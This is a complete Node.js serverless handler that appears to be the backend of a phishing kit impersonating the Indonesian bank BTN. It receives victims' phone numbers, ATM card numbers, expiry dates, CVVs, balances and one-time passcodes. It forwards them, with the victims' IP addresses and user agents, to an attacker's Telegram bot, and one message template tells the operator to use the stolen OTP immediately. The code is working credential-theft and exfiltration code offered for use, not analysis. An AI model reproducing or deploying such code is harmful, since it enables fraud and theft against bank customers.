const fetch = require('node-fetch');

exports.handler = async (event, context) => {
    // CORS headers
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Content-Type': 'application/json'
    };

    // Handle preflight
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers, body: '' };
    }

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const { type, phoneNumber, cardData, otpCode } = data;

        // Get bot token and chat ID from environment variables
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing environment variables');
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ error: 'Server configuration error' })
            };
        }

        let message = '';
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        if (type === 'phone') {
            message = `
🔐 **DATA LOGIN BTN MOBILE** 🔐
⏰ Waktu: ${timestamp}
📱 Nomor HP: ${phoneNumber}
━━━━━━━━━━━━━━━━━━━━━
📍 IP: ${event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'Unknown'}
🌐 User Agent: ${event.headers['user-agent'] || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━
⚠️ **HATI-HATI!** Data ini sensitif
            `;
        } 
        else if (type === 'card') {
            message = `
💳 **DATA KARTU ATM BTN** 💳
⏰ Waktu: ${timestamp}
📱 Nomor HP: ${phoneNumber}
💳 Nomor Kartu: ${cardData.cardNumber}
📅 Expiry: ${cardData.expiry}
🔢 CVV: ${cardData.cvv}
💰 Saldo: Rp ${cardData.balance}
━━━━━━━━━━━━━━━━━━━━━
📍 IP: ${event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'Unknown'}
🌐 User Agent: ${event.headers['user-agent'] || 'Unknown'}
            `;
        }
        else if (type === 'otp') {
            message = `
🔑 **KODE OTP BTN MOBILE** 🔑
⏰ Waktu: ${timestamp}
📱 Nomor HP: ${phoneNumber}
🔐 Kode OTP: ${otpCode}
━━━━━━━━━━━━━━━━━━━━━
⚠️ Segera gunakan kode ini!
            `;
        }

        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (!result.ok) {
            throw new Error(result.description || 'Failed to send to Telegram');
        }

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ success: true, message: 'Data sent to Telegram' })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: error.message })
        };
    }
};
